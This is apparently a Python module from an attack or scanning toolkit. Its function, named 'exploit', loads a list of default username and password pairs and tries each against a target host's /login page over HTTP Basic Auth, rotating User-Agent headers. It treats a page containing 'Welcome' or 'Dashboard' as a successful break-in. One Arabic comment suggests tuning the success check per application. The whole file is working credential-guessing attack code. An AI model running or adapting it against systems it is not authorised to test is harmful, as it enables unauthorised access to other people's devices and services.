import aiohttp
import json

async def exploit(target, port, user_agents):
    creds = []
    try:
        with open("data/default_creds.json", "r") as f:
            creds = json.load(f)
    except Exception:
        return None

    headers_template = {"User-Agent": ""}
    async with aiohttp.ClientSession() as session:
        for cred in creds:
            username = cred.get("username")
            password = cred.get("password")
            url = f"http://{target}:{port}/login"
            for agent in user_agents:
                headers_template["User-Agent"] = agent
                try:
                    async with session.post(url, headers=headers_template, auth=aiohttp.BasicAuth(username, password), timeout=10) as resp:
                        if resp.status == 200:
                            text = await resp.text()
                            # ممكن تضيف شروط أدق حسب التطبيق
                            if "Welcome" in text or "Dashboard" in text:
                                return f"Default creds found: {username}/{password} at {url}"
                except Exception:
                    continue
    return None
